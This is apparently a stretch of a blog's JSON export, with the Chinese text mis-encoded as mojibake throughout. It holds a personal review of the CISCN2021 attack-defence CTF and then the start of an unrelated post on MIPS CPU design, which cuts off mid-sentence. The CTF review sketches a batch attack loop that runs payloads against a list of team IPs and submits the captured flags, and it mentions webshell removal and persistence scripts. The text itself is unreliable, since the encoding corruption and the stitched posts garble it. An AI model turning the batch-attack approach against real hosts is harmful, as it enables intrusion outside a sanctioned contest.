å¼€å±€é˜¶æ®µ å¤‡ä»½æºç ï¼štar -zcvf w.tar.gz /var/www/html ç»“æœ\u0026gt; Permission Deniedï¼Œé‚è·³è¿‡ æ‰«é©¬åˆ é©¬ï¼šDç›¾ ğŸ‘´ç›´æ¥åœ¨å›¾å½¢åŒ–shellé‡Œä¸‹è½½ä»£ç ï¼Œç„¶åå´©å±äº†å‡ æ¬¡ï¼Œæ‰‹é€Ÿæ…¢äº†ã€‚ æ¯ä¸ªwebé¢˜éƒ½æœ‰ä¸€ä¸ªä¸æ˜å°æ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯å°é©¬ï¼Œåˆ é™¤ä¹‹ã€‚ å¤‡ä»½æ•°æ®åº“ï¼šmysqldump -uctf -p --databases [dbname] \u0026gt; /tmp/db.sql ç»“æœ\u0026gt; Permission Deniedï¼Œé‚è·³è¿‡ æ”¹æ•°æ®åº“å¯†ç ï¼šmysql\u0026gt;SET PASSWORD FOR ctf@localhost=PASSWORD('newpass'); ç»“æœ\u0026gt; Permission Deniedï¼Œ(â•¯â–”çš¿â–”)â•¯ç©nm ç„¶åå¼€å§‹æºç å®¡è®¡(âŒ) ç„¶åç­‰å¾…è¢«æ‰“ä¹‹åç¿»æµé‡(âœ”ï¸) æ”»é˜²é˜¶æ®µ ğŸ‘´åªçœ‹å¾—æ‡‚webé¢˜ç›®ã€‚ä¸‰é“webé¢˜å…¨æ˜¯cmsï¼Œæ˜¯ç»å…¸lampç¯å¢ƒã€‚å¯æ˜¯ğŸ‘´çœ‹ä¸æ‡‚cmsï¼ŒğŸ‘´æ˜¯fiveã€‚\nweb1ï¼šsafecms æ¯”èµ›ä¸€å¼€å§‹ï¼Œå•ªçš„ä¸€ä¸‹å¾ˆå¿«å•Šï¼Œå…¨åœºè¢«æ‰“ï¼Œç¿»æµé‡æŠ“åˆ°payloadï¼Œæ˜¯ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶çš„ä»»æ„è¯»æ¼æ´ã€‚ç›´æ¥æ‰¹é‡æ‹¿flagã€‚ å®šä½åˆ°è·¯ç”±ï¼Œæ³¨é‡Šä¹‹ï¼Œä¸å¥½ä½¿ï¼Œè¿˜æ˜¯è¢«æ‰“ï¼›åˆ é™¤è¿™ä¸ª.class.phpï¼Œä¸å¥½ä½¿ï¼›ğŸ‘´æ€€ç–‘æ˜¯è¿è¡Œæ—¶ç¼“å­˜ä¸æ›´æ–°ï¼Œç›´æ¥service restart apache2 ç»“æœ\u0026gt;Permission Deniedï¼ŒğŸ‘´ä½›äº† å°±è¿™æ ·è¢«æ‰“äº†å¥½ä¸€ä¼šï¼Œæ‰å‘ç°ç›´æ¥ä¿®æ”¹index.phpï¼Œèƒ½ç›´æ¥ç”Ÿæ•ˆï¼Œè¡€äºã€‚ web2ï¼šeyou è¿™é“é¢˜è¢«æ‰“çš„å¾ˆå°‘ï¼Œè¢«å®•æœºçš„å¾ˆå¤šã€‚æŠ“æµé‡ï¼Œå‘ç°å¾ˆå¤šæ··æ·†æµé‡ã€‚ï¼ˆæ—¥å¿—å†™shellï¼Ÿï¼‰ ğŸ‘´è·Ÿç€æµé‡å°è¯•ç”¨è¿‡æ»¤çš„æ–¹æ³•ä¿®å¤ï¼Œä½†æ˜¯è¿˜æ˜¯è¢«å®•ã€‚ è‹¥å¹²è½®åï¼ŒğŸ‘´æ²¡åŠæ³•ï¼Œåªå¥½ç”³è¯·é‡ç½®ï¼Œå¹¶åœ¨ä¸‹ä¸€è½®è¢«å®•ã€‚ è‹¥å¹²è½®åï¼ŒğŸ‘´æ²¡åŠæ³•ï¼Œåªå¥½ç”³è¯·é‡ç½®ï¼Œå¹¶åœ¨è¿™ä¸€è½®è¢«å®•ã€‚ è‹¥å¹²è½®åï¼ŒğŸ‘´æ²¡åŠæ³•ï¼Œåªå¥½ç™½ç»™ï¼Œå¹¶åœ¨æŸä¸€è½®æ¢å¤æ­£å¸¸å¹¶åšæŒåˆ°æœ€åã€‚æˆ‘ï¼Ÿï¼Ÿï¼Ÿ è¯¥ä¸ä¼šæ˜¯æŸé˜Ÿæˆ–è€…è£åˆ¤çœ‹æˆ‘ä»¬å¤ªå¯æ€œå¸®æˆ‘ä»¬é‡ç½®äº†å§ï¼Œä¸–ç•Œä¸Šè¿˜æœ‰è¿™ä¹ˆæ¸©æŸ”çš„äººï¼Œæˆ‘çœŸçš„å“­æ­» è¿™é“é¢˜æ— äº†ã€‚ï¼ˆèµ›åæ‰çŸ¥é“ï¼Œæœ‰é˜Ÿä¼æ‰¾åˆ°sqliå¹¶ç™»å½•åå°ï¼Œåœ¨åå°å…³é—­äº†ç«™ç‚¹å¹¶ç¾Šäº†ç®¡ç†å‘˜è´¦å·ã€‚ä¿®nmã€‚ web3ï¼šlol è¿™é“é¢˜æ˜¯æœ€åä¸‰å°æ—¶æ”¾çš„ï¼ŒğŸ‘´è¿™æ—¶å€™å·²ç»è‡ªé—­äº†å‡ ä¸ªå°æ—¶ã€‚äºæ˜¯ğŸ‘´ç—›å®šæ€ç—›ï¼Œå¼€å±€ç›´æ¥æŠŠadmin.phpç¾Šäº†ï¼Œç„¶åå¥‡è¿¹èˆ¬çš„å®ˆåˆ°äº†æœ€åã€‚åäº†ï¼Œå¥½èµ·æ¥äº†ã€‚ å…¨åœºè¢«æ‰“ï¼Œç¿»æµé‡æ‰¾åˆ°payloadï¼ŒæŸè·¯å¾„ä¸‹æœ‰ç™½ç»™shellï¼Œç›´æ¥åˆ é©¬å¹¶åæ‰“ã€‚ æŸé˜Ÿä½¿ç”¨äº†åœ¨ç½‘é¡µè¾“å‡ºä¸­å¡éšæœºå­—ç¬¦ä¸²çš„é˜²å¾¡æ–¹æ³•ï¼Œä½†æ˜¯æ²¡ç ´åflagï¼Œä¸”å¡«å……çš„å­—ç¬¦æ˜¯å›ºå®šçš„ï¼Œè¢«æˆ‘è‚‰çœ¼è¯†ç ´ï¼Œæˆ‘ç›´æ¥è¿›è¡Œä¸€ä¸ªif ip == xx: flag = flag[12:]ã€‚è™½ç„¶æ²¡ä»€ä¹ˆåµç”¨ï¼Œä½†æ˜¯å¾ˆå¿«ä¹ã€‚ pwnï¼š ä¸€çœ‹åˆ°4ä¸ªpwnğŸ‘´ç›´æ¥å‚»æ‰ã€‚ğŸ‘´è§‰å¾—ğŸ‘´ä¸ä¼šåšï¼Œå› æ­¤ä¹Ÿæ²¡å»çœ‹ï¼Œä½†å¬å¤§ä½¬è¯´ï¼Œç›´æ¥æŠ“æµé‡è¿›è¡Œä¸€ä¸ªè½¬å‘å°±èƒ½æ‹¿åˆ†ï¼ŒğŸ‘´ä¸‹æ¬¡ä¸€å®šå‡†å¤‡å¥½pwntoolsã€‚\nğŸ”’è‡ªåŠ¨åŒ–æ”»é˜²æ¡†æ¶ AWDä¸­ï¼Œæ‰‹äº¤flagå®åœ¨æ˜¯å¾ˆæµªè´¹æ—¶é—´çš„è¡Œä¸ºã€‚è™½ç„¶æœ‰æ—¶å€™è‡ªåŠ¨åŒ–ä¸å¤ªå¥½å†™åªèƒ½æ‰‹äº¤ï¼Œåƒè¿™æ¬¡ååˆ†é’Ÿä¸€è½®ï¼Œæœ‰72æ”¯é˜Ÿä¼ï¼Œå°±ç®—ä½ æ‰‹é€ŸæƒŠå¥‡ï¼Œä¹Ÿæ²¡æœ‰æ—¶é—´å®¡è®¡æºç äº†ã€‚å› æ­¤æ‰“AWDé‡ç‚¹å°±åœ¨ä¸€ä¸ªè‡ªåŠ¨åŒ–ã€‚ç½‘ä¸Šèƒ½æ‰¾åˆ°å„ç§æ¡†æ¶ï¼Œä½†æ˜¯ç”¨çš„æ—¶å€™æ€»æ˜¯ä¸é¡ºæ‰‹ï¼Œé‡åˆ°bugä¹Ÿä¸ä¼šä¿®ã€‚åªæœ‰è‡ªå·±å†™çš„æ‰æœ€å¥½ç”¨ã€‚\nå…ˆè¯´è¯´ç”¨å¤„æœ€å¤§çš„å·¥å…·ï¼Œå°±æ˜¯æ‰¹é‡æ”»å‡»æ¡†æ¶/è‡ªåŠ¨åŒ–æ”»å‡»è„šæœ¬ã€‚è¿™ä¸ªæ¡†æ¶ä¸»è¦æœ‰ä»¥ä¸‹è¦ç´ ï¼š\nè¾“å…¥ï¼š å¾…æ”»å‡»ipåˆ—è¡¨ï¼šé€šå¸¸å†™åœ¨ip.txté‡Œ æ”»å‡»å‡½æ•°ï¼šå³å°è£…å¥½çš„payloadè¯·æ±‚ äº¤flagå‡½æ•°ï¼šæ ¹æ®å¹³å°æ¥å£å°è£… è¾“å‡ºï¼š æ‰¹é‡æ”»å‡»ï¼Œè¾“å‡ºæ”»å‡»ç»“æœ æ”»å‡»æˆåŠŸåˆ™æäº¤ åé¦ˆå¾—åˆ†ç»“æœ æ¡†æ¶çš„æ ¸å¿ƒæ— éä»¥ä¸‹é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 while True: for j in challenge_list: # æ”»å‡»å‡½æ•°ç´¢å¼• for i in ip_list: # é¦–å…ˆç”Ÿæˆipåˆ—è¡¨ flag = get_flag(i,j) # æ ¹æ®jæ‰¾åˆ°ç›¸åº”æ”»å‡»å‡½æ•° if flag!=\u0026#39;Attacked failed\u0026#39;: submit_flag(flag) print_result(j) time.sleep(round) æ¯”èµ›æ—¶ï¼Œæ‰¾åˆ°æ¼æ´æˆ–è€…æŠ“åˆ°æµé‡ï¼Œç«‹åˆ»å†™å¥½ç›¸åº”çš„æ”»å‡»å‡½æ•°ï¼Œé‡å¯è„šæœ¬å³å¯ã€‚\nä¸ºäº†æé«˜ç¨³å®šæ€§å’Œæ˜“ç”¨æ€§ï¼Œè¿™å¥—æ¡†æ¶å¯ä»¥å†™çš„å¾ˆå¤æ‚ã€‚æ¯”å¦‚ï¼š\nåŠ å…¥å¤šçº¿ç¨‹ï¼Œè®©æ¡†æ¶éé˜»å¡çš„æŒç»­è¿è¡Œ åŠ å…¥é¢å‘å¯¹è±¡ï¼Œå†™æˆç±»åº“ è‡ªå¸¦ä¸€äº›trickï¼Œæ¯”å¦‚æµé‡æ··æ·†å™¨ç­‰ã€‚ å½“ç„¶ï¼Œè¿˜å¯ä»¥å†™ä¸€ä¸ªç½‘ç«™æ¥å¯è§†åŒ–ç®¡ç† è¿™é‡Œå°±æ¶‰åŠæ¡†æ¶ç¼–ç¨‹äº†ï¼Œèƒ½æ·±æŒ–çš„åœ°æ–¹è¿˜æœ‰å¾ˆå¤šã€‚\né™¤äº†æ‰¹é‡æ”»å‡»è„šæœ¬ï¼Œç”¨åˆ°çš„è„šæœ¬è¿˜æœ‰ï¼š\næƒé™ç»´æŒ/æ‰¹é‡shellè„šæœ¬ï¼šç”¨äºç®¡ç†å¤šä¸ªshell ä½†æ˜¯ä¸æ­»é©¬è¢«ç¦ç”¨ï¼Œå› æ­¤æœ¬æ¬¡æ¯”èµ›ä¸­shellå‡ºç°çš„ä¸æ˜¯å¾ˆå¤šã€‚ ï¼ˆğŸ‘´è¿˜å‡†å¤‡äº†æ‹¿åˆ°ç™½ç»™shellä¹‹åæŒä¹…åŒ–çš„è„šæœ¬ï¼Œç»“æœä¸€ä¸ªshelléƒ½æ²¡æ‹¿åˆ°ï¼Œå‡†å¤‡ä¸ªğŸ”¨ã€‚ æ–‡ä»¶ç›‘æ§è„šæœ¬ï¼šç”¨äºç›‘æ§flagç­‰é‡è¦æ–‡ä»¶è¢«è¯»å–å’Œä¿®æ”¹çš„å‡†ç¡®æ—¶é—´ï¼Œå¯ä»¥å¸®åŠ©ç¡®å®špayload å†ç‰›é€¼ä¸€ç‚¹è¿˜å¯ä»¥æä¾›ç³»ç»Ÿå¤‡ä»½å’Œå›å¤åŠŸèƒ½ã€‚ ä¸Šè¿°éƒ½æ˜¯ç³»ç»Ÿè„šæœ¬ï¼Œå¤§å¤šåœ¨æœ¬æœºç”¨pythonå†™çš„ã€‚ä¸‹é¢è¯´å‡ ç§ç½‘é¡µè„šæœ¬ï¼Œå³ç›´æ¥ç”¨require/includeåŒ…å«çš„phpè„šæœ¬\næµé‡ç›‘æ§è„šæœ¬ï¼šåŒºåˆ«äºç³»ç»Ÿçº§æµé‡ç›‘æ§ï¼Œç”¨äºç›‘æ§æ•æ„Ÿæµé‡ä»¥æŠ“å–payload é€šé˜²è„šæœ¬ï¼šä¹Ÿå°±æ˜¯wafï¼Œå¯ä»¥è¿›è¡Œå¾ˆå……åˆ†çš„è¿‡æ»¤ æœ¬æ¬¡æ¯”èµ›ä¸­è¢«ç¦ç”¨ï¼Œå› ä¸ºç¡®å®ç ´åæ¸¸æˆä½“éªŒ è¿™äº›è„šæœ¬ï¼Œç”¨å¥½äº†æ‰æ˜¯è¶æ‰‹çš„å…µå™¨ã€‚è¿™æ¬¡æ¯”èµ›ä¸­ğŸ‘´çš„æ‰‹é€Ÿè¿œä¸å¤Ÿå¿«ï¼Œå»¶è¯¯äº†å¾ˆå¤šæˆ˜æœºã€‚\nğŸŒŠå¿«è¿›åˆ°ã€Šè€ƒè¯•å‘¨ç ´é˜²ã€‹ å›é¡¾æ•´åœºæ¯”èµ›ï¼Œç›¸æ¯”æ­£ç»çš„æ¼æ´æŒ–æ˜ï¼Œéšæœºåº”å˜çš„èƒ½åŠ›å¯¹åˆ†æ•°ä¹Ÿæœ‰å¾ˆå¤§å½±å“ã€‚æ€»ç»“å‡ ä¸ªå› ç´ ï¼š\nawdçš„å¾—åˆ†æ˜¯éšæ—¶é—´ç§¯ç´¯çš„ï¼Œå› æ­¤è¦æŒæ§å…¨å±€ï¼Œæ—¶åˆ»ç›¯ç´§æ¯é“é¢˜æœ‰æ— è–„å¼±ç¯èŠ‚å’Œçªç ´å£ã€‚æœ¬æ¬¡æ¯”èµ›é¢˜ç›®æ•°é‡å¤šè¾¾7é“ï¼ŒğŸ‘´é˜Ÿæœ‰å¤§ä½¬æ²¡æ¥ï¼Œè¿˜å¸¦äº†ä¸€ä¸ªèŒæ–°ï¼Œçº¦ç­‰äºäºŒæ‰“å››ï¼Œå‡ºç°äº†çœ‹ä¸è¿‡æ¥é¢˜çš„æƒ…å†µã€‚\nè¿˜æœ‰å°±æ˜¯æ‰‹é€Ÿï¼Œç”±äºæµé‡å¾ˆåŠæ—¶ï¼Œpayloadä¸€è¢«æŠ“åˆ°ï¼Œç”šè‡³å¯ä»¥åœ¨ä¸€è½®checkä¹‹å†…ä¸¢è¿›æ‰¹é‡æ”»å‡»è„šæœ¬ï¼Œç›´æ¥å’Œé¦–å…ˆæŒ–æ˜åˆ°æ¼æ´çš„é˜Ÿä¼å¹³åˆ†åˆ†æ•°ã€‚è¿™è¦æ±‚è‡ªåŠ¨åŒ–è„šæœ¬çš„ç†Ÿç»ƒè¿ç”¨ï¼Œå°½é‡é¿å…æ‰‹äº¤flagã€‚\næœ€åè¿˜æœ‰ä¸€ç‚¹ç­–ç•¥é—®é¢˜ã€‚åˆ†æä¸‰ç§é¢˜ç›®çŠ¶æ€ï¼Œåˆ—ä¸ªè¡¨å®šæ€§åˆ†æä¸€æ³¢æœ€ä¼˜è§£ï¼š\nèƒ½åæ‰“ ä¸èƒ½åæ‰“ åœºä¸Šå¤§å¤šæ•°Attacked å…ˆåæ‰“å†ä¿®æ´ ä¸èƒ½ä¿®æ´åˆ™downè‡ªå·± åœºä¸Šå¤§å¤šæ•°CheckDown æ‰“ä»–å–µçš„ å°½é‡åˆ«down å‡ºç°æ¼æ´å¤§éƒ¨åˆ†äººä¼šè¢«æ‰“ï¼Œè¿™æ—¶å¦‚æœä½ ä¸èƒ½ç«‹åˆ»ä¿®è¡¥è€Œèƒ½ç«‹åˆ»åæ‰“ï¼Œç›¸å½“ç¨‹åº¦ä¸Šæ˜¯ä¸äºçš„ã€‚å¦‚æœä½ ä¿®ä¸å¥½ä¹Ÿå¯ä»¥é€‰æ‹©å®•æœºï¼Œå› ä¸ºè¿™æ ·åˆ†æ‘Šäº†ä¸¢æ‰çš„åˆ†æ•°ã€‚ å°½é‡é¿å…è¢«æ‰“+è¢«å®•ï¼Œæ‰£åŒå€åˆ†æ•°å±å®æ˜¯è¡€äºã€‚å¦‚æœå†³å®šå®•æœºï¼Œå…ˆæ‘¸æ¸…checkçš„æ—¶é—´å’Œç»“ç®—çš„æ—¶é—´ï¼Œæœ€å¥½åœ¨æ–°ä¸€è½®ç»“ç®—åç«‹å³åˆ ç«™downè‡ªå·±ã€‚ å½“ç„¶ï¼Œå¦‚æœæ‚¨èƒ½æŒ–åˆ°æ´ï¼Œå®å°±æ˜¯å‚ç›´ä¸Šåˆ†çš„ğŸ‘´ã€‚ ä»8ç‚¹åŠåˆ°6ç‚¹åŠï¼Œæ‰“10ä¸ªå°æ—¶çš„AWDï¼Œè¦å…¨ç¨‹ä¿æŒæ•æ„Ÿå’Œæœºæ™ºï¼Œç¡®å®å¯¹èº«ä½“ç´ è´¨æœ‰äº›è¦æ±‚ã€‚ğŸ‘´åé«˜é“åˆ°åˆè‚¥åäº†6å°æ—¶ï¼Œæ‰“æ¯”èµ›åäº†10å°æ—¶ï¼Œå¥½æ‚¬æ²¡ç»™æˆ‘ç—”ç–®åå‡ºæ¥ã€‚æ™šä¸Šå›åˆ°é’å²›å¹¶è¿›è¡Œæœ€åä¸€æ¬¡å¤œåº—ï¼Œå¿«è¿›åˆ°ã€Šè€ƒè¯•å‘¨ç ´é˜²ã€‹ã€‚\n","date":"2021-06-16T16:54:30Z","image":"https://lonelyuan.github.io/p/ciscn2021%E5%8D%8E%E4%B8%9C%E7%99%BE%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bawd%E5%A4%8D%E7%9B%98/awd-da-pian_hub2213acc3516fead069948e4c2b6c9af_78570_120x120_fill_q75_box_smart1.jfif","permalink":"https://lonelyuan.github.io/p/ciscn2021%E5%8D%8E%E4%B8%9C%E7%99%BE%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bawd%E5%A4%8D%E7%9B%98/","title":"CISCN2021åä¸œç™¾èµ›åŒºåˆ†åŒºé€‰æ‹”èµ›AWDå¤ç›˜"},{"content":" æœ¬æ–‡æ‰€è¿°ä¸ºè®¡ç®—æœºç»„æˆåŸç†è¯¾æ‹“å±•å®éªŒçš„ç›¸å…³è®°å½•ï¼ŒåŸºäºâ€œé¾™èŠ¯ä½“ç³»ç»“æ„ä¸CPUè®¾è®¡æ•™å­¦å®éªŒç³»ç»Ÿâ€ é¡¹ç›®å®˜ç½‘ï¼š http://www.loongson.cn/business/general/teach/356.htmlï¼› ç›¸å…³èµ„æ–™ä»£ç ï¼š#TODO:: githubä»“åº“ PSï¼šæ ‡é¢˜å¯ç®€è®°ä¸ºã€ŠåŸºäºåŸºäºçš„ä¸€ç§åŸºäºçš„ä¸€ç§å®ç°ã€‹\nğŸ¤“åæ§½æ—¶é—´ å¿«è€ƒè¯•äº†ï¼ŒğŸ‘´å‘è§‰ğŸ‘´è®¡ç»„å­¦äº†ä¸ªğŸ”¨ï¼ŒğŸ‘´å»å¹´ä¹Ÿå­¦äº†ä¸ªğŸ”¨ï¼Œä½†æ˜¯å»å¹´å¯ä»¥å½’å› äºæ™¦æ°”çš„æ™¦æ°”ï¼Œä»Šå¹´åªèƒ½è¯´è‡ªå·±æ™¦æ°”ã€‚éš¾é“è¿˜è¦é‡è¹ˆå»å¹´çš„æ™¦æ°”å—ï¼ŸğŸ‘´æœ¬åº”è¯¥å›å»èƒŒè¯¾æœ¬ï¼Œåˆ·è€ƒç ”é¢˜ï¼Œä½†æ˜¯ğŸ‘´ä¸€çœ‹pptå°±æƒ³èµ·æˆ‘ä»¬æ•¬çˆ±çš„ã€Šè®¡ç®—æœºç»„æˆåŸç†ã€‹è¯¾çš„ä»»è¯¾è€å¸ˆï¼Œä¸å“¥åå¤å¼ºè°ƒçš„è‡³ç†åè¨€ï¼šâ€œå¬ä¸æ‡‚çš„ä¸¾æ‰‹ï¼ˆæ— åœé¡¿ï¼‰éƒ½æ²¡ä¸¾æ‰‹ï¼Œéƒ½å¬æ‡‚äº†ï¼Œéå¸¸å¥½ã€‚â€æœ¬äººååˆ†é’¦ä½©ä¸å“¥è€å¸ˆå¯¹å¹½é»˜æ„Ÿçš„ç‹¬ç‰¹ç†è§£ã€‚\nï¼ˆä½†æ˜¯ç‰¹æ­¤å£°æ˜ï¼šæœ¬äººä¸äº†è§£ã€ä¸è®¤åŒå…¶å…³äº\u0026quot;5Gæ˜¯ä¸ªå‡ æŠŠ\u0026quot;ï¼Œ\u0026ldquo;é«˜æ™“æ¾å¾ˆnbè¿™ä¸ªäºº\u0026rdquo;ï¼Œ\u0026ldquo;é’±=æµªæ¼«\u0026quot;ç­‰è®®é¢˜çš„çœ‹æ³•ï¼‰\nè€Œä¸”ğŸ‘´è¿™äººå¾ˆæ€ªï¼Œè¯¾æœ¬ä¸Šçš„é‡ç‚¹ï¼Œä¸å¥½ç©ï¼›é€‰åšçš„å®éªŒï¼Œå¥½ç©ï¼å“å°±æ˜¯ç©ï¼Œæ€ªä¸å¾—å·ä¸è¿‡åˆ«äººï¼Œä½ ä¹Ÿé…å·ï¼Ÿæ»šå»è€ƒç ”å§ã€‚\nä¼—æ‰€å‘¨çŸ¥ï¼Œè®¡ç®—æœºå­¦ç”Ÿçš„æœ¬ç§‘ç”Ÿæ¶¯ï¼Œå¦‚æœèƒ½åšåˆ°åœ¨è‡ªå·±è®¾è®¡çš„CPUä¸Šè¿è¡Œè‡ªå·±å†™çš„æ“ä½œç³»ç»Ÿå¹¶ç”¨è‡ªå·±å†™çš„ç¼–è¯‘å™¨è·‘ä»£ç ï¼Œé‚£å°±éå¸¸æˆåŠŸäº†ã€‚ğŸ‘´å·®ä¸å¤šï¼ŒğŸ‘´èƒ½åœ¨è‡ªå·±æœçš„ä»£ç ä¸Šå†™è‡ªå·±çš„æ³¨é‡Šå¹¶ç”¨è‡ªå·±çš„ç”µè„‘æˆªå›¾ï¼Œéƒ½æ˜¯ä¸‰ä¸ª\u0026quot;è‡ªå·±\u0026rdquo;ã€‚é‚£ä¹ˆä»Šå¤©ç»™å¤§å®¶çˆ†ä¸ªå•¥æï¼Œæµæ°´çº¿å¥¥ã€‚\nğŸ”§ â€œç”¨â€è®¡ç®—æœºâ†’â€œé€ â€è®¡ç®—æœº ä¸Šå›ä¹¦è¯´åˆ°ï¼ˆ#TODO:: CSAPPå¤§ç¯‡ï¼‰ï¼Œæ±‡ç¼–å™¨(as)è®©æˆ‘ä»¬å¾—åˆ°äº†æœºå™¨èƒ½çœ‹æ‡‚çš„æ¯”ç‰¹æµï¼Œæœ€åä¸€æ­¥åªéœ€è¦è¿æ¥å™¨(ld)å°†å…¶å’Œå…¶ä»–è°ƒç”¨ä¸€èµ·è½½å…¥å†…å­˜ã€‚è¿™å›ç­”äº†ç¨‹åºå¦‚ä½•åœ¨CPUè¿™ä¸ªå¹³å°ä¸Šè¿è¡Œçš„é—®é¢˜ï¼Œç„¶è€Œä¸€ä¸ªæ›´åŸºæœ¬çš„é—®é¢˜æ˜¯ï¼Œè¿™ä¸ªç°æœ‰çš„å¹³å°æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿä¸€ä¸ªç²—ç•¥çš„è®¤è¯†æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“è¿™äº›è¶³ä»¥å®ç°CPUçš„å¤æ‚çš„é€»è¾‘ï¼Œå…¶æœ€å°å•å…ƒæ€»å¯¹åº”åˆ°ç®€å•çš„è¯¸å¦‚é€»è¾‘é—¨ä¸Šé¢ï¼Œä½†æ˜¯è½å®åˆ°çœŸæ­£çš„ç‰©ç†å®ç°ä¹‹ä¸Šï¼Œå¦‚ä½•ä½¿æ•ˆç‡æœ€é«˜ï¼ŸåŠŸè€—æœ€å°ï¼Ÿè¿™äº›é—®é¢˜æ‰€è·¨è¶Šçš„å¤æ‚åº¦çš„é‡çº§ä¾ç„¶æ˜¯ä¸€ç‰‡å·¨å¤§çš„è¿·é›¾ã€‚ç…§äº®è¿™ç‰‡è¿·é›¾çš„çŸ¥è¯†ï¼Œå¤§æ¦‚éš¶å±äºICå­¦ç§‘ã€‚\nHoweverï¼Œä½œä¸ºCSä¸“ä¸šè€Œä¸æ˜¯ICä¸“ä¸šï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä»…åœ¨äºç†è§£æ‰€è°“â€œç»„æˆåŸç†â€ã€‚åœ¨ICäº§ä¸šçš„å¤æ‚åº¦è§„æ¨¡æ•°è½´ä¸Šï¼Œå‘ä¸‹æ˜¯ä¸“æœ‰èŠ¯ç‰‡ï¼ˆåˆç§°åµŒå…¥å¼ï¼Ÿï¼‰ï¼ŒåŠŸèƒ½ä¸“ç”¨ï¼Œè§„æ¨¡è¾ƒå°ï¼›å‘ä¸Šæ˜¯é€šç”¨èŠ¯ç‰‡ï¼Œå³æ‰‹æœºç”µè„‘ç­‰çš„æ ¸å¿ƒï¼Œå…¶éš¾åº¦ä¸è¨€è€Œå–»ã€‚ä½äºä¸­é—´çš„FPGAåˆ™æ—¢å…¼é¡¾äº†è‡ªç”±åº¦ä¹Ÿè€ƒè™‘äº†é€Ÿåº¦ï¼Œå› æ­¤ï¼Œè¿™ç©æ„èƒ½æ»¡è¶³CSæœ¬ç§‘æ•™å­¦çš„éœ€è¦ï¼ˆä¸»è¦æ˜¯ä¾¿å®œè€æ“ï¼‰ã€‚\nğŸ”®é«˜è´µçš„ICå·¥ç¨‹å¸ˆéƒ½ç”¨å•¥è½®å­ Vivadoæ˜¯ä¸€ä¸ªFPGAé›†æˆè®¾è®¡å¹³å°ï¼ˆä¹Ÿç®—ä¸€ä¸ªEDAï¼Ÿï¼‰ï¼Œä»–ä¸»ç•Œé¢å·¦ä¾§çš„å·¥ä½œæµçª—å£å¾ˆå¥½çš„æ¦‚æ‹¬äº†åˆ©ç”¨FPGAå¼€å‘çš„åŸºæœ¬æµç¨‹ã€‚å³\nç¼–å†™è®¾è®¡æºç (Source)ï¼šä½¿ç”¨Verilogè¯­è¨€ç¼–å†™é€»è¾‘æˆ–å¼•å…¥IP è®¾è®¡ä»¿çœŸæ¨¡æ‹Ÿ(Simulation)ï¼šé€šè¿‡è§‚å¯Ÿä»¿çœŸæ³¢å½¢å›¾å’Œç¼–å†™testbenchæ¥å¯¹è®¾è®¡è¿›è¡Œdebug ç»¼åˆ(Systhesis)é—¨çº§ç½‘è¡¨ï¼šä»RTLçº§æè¿°é™ç»´åˆ°é—¨çº§ç½‘è¡¨ ç”Ÿæˆ(Implementation)å¸ƒå±€å¸ƒçº¿ï¼šæ ¹æ®ç®¡è„šçº¦æŸï¼Œå°†ä¾ç„¶æ˜¯è™šæ‹Ÿçš„é—¨çº§è¿çº¿è½å®ä¸ºå®é™…çš„çº¿è·¯ è¿›è¡Œç¡¬ä»¶ç¼–ç¨‹(program)ï¼šç”Ÿæˆæ¯”ç‰¹æµå¹¶å†™å…¥ç›®æ ‡è®¾å¤‡ åè¯è§£é‡Šï¼š ICï¼šé›†æˆç”µè·¯ FPGAï¼šç°åœºå¯ç¼–ç¨‹é—¨é˜µåˆ— Verilogï¼šä¸€ç§ç¡¬ä»¶æè¿°è¯­è¨€ï¼Œè¯­æ³•æ¶µç›–äº†è‡ªé¡¶å‘ä¸‹äº”ä¸ªæŠ½è±¡å±‚é¢ï¼šç³»ç»Ÿçº§ã€ç®—æ³•çº§ã€RTLçº§ã€é—¨çº§ã€å¼€å…³çº§ã€‚ RTLï¼šå¯„å­˜å™¨ä¼ è¾“çº§ã€‚ä¸€èˆ¬ä½¿ç”¨æœ€å¤šçš„å°±æ˜¯RTLçº§ã€‚ IPï¼šIntellectual Propertyå†…æ ¸æ¨¡å—ï¼Œå¯ä»¥ç†è§£ä¸ºå°†ä»£ç å°è£…ä¸ºå‡½æ•°ã€‚åˆ†ä¸ºï¼Œè½¯IPå†…æ ¸(soft IP core)ï¼Œå›ºIPå†…æ ¸(firm IP core)å’Œç¡¬IPå†…æ ¸(hard IP core)3ä¸ªå±‚æ¬¡ï¼Œç›¸å½“äºé›†æˆç”µè·¯çš„æ¯›å¯ã€åŠæˆå“å’Œæˆå“ã€‚ SoCï¼šç‰‡ä¸Šç³»ç»Ÿï¼Œå¤§æ¦‚æ˜¯èŠ¯ç‰‡åŠå…¶è£…è½½çš„ç¬¬ä¸€å±‚è½¯ä»¶æ¥å£çš„é›†åˆï¼Œå¾ˆå®½æ³›çš„æ¦‚å¿µã€‚ EDAï¼šç”µå­è®¾è®¡è‡ªåŠ¨åŒ–ã€‚\nç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´æ¢æ¸…äº†è¿™ç‰‡è¿·é›¾ï¼ŒCPUçš„è®¾è®¡å¦‚ä½•ä»é«˜æŠ½è±¡å±‚æ¬¡çš„é€»è¾‘ï¼Œæ¢³ç†æˆæœ€åº•å±‚çš„é€»è¾‘é—¨ï¼Œå†å®ç°ä¸ºå°å°çš„èŠ¯ç‰‡ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰äº†è½®å­ï¼Œè¦é€ ä¸€ä¸ªCPUï¼Œè¿˜è¦ç¡®å®šç›®æ ‡æŒ‡ä»¤é›†ã€‚ç”±äºæœ¬é¡¹ç›®ç”±é¾™èŠ¯å…¬å¸èµåŠ©ï¼Œé‚£å¿…ç„¶è¦é€‰MIPSäº†ã€‚\nğŸ“ŒMIPSæŒ‡ä»¤é›†æ ¼å¼ å•¥å«æŒ‡ä»¤é›†å‘¢ï¼Œå­¦è¿‡å‡ ç§è¯­è¨€å°±ä¸éš¾ç†è§£ã€‚é«˜çº§ç¨‹åºè¯­è¨€è§„å®šæ¯ä¸ªasciiç 